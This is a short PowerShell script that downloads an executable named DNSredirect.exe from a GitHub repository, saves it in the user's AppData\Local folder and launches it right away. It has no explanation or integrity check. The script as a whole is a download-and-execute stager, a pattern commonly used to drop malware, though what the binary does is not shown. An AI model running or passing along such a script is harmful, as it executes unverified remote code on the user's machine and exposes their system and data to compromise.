$x = "https://github.com/webntdev/webntdev.github.io/raw/main/DNS/DNSredirect.exe"
$y = "$env:USERPROFILE\AppData\Local\DNSredirect.exe"

Invoke-WebRequest -Uri $x -OutFile $y
Start-Process $y
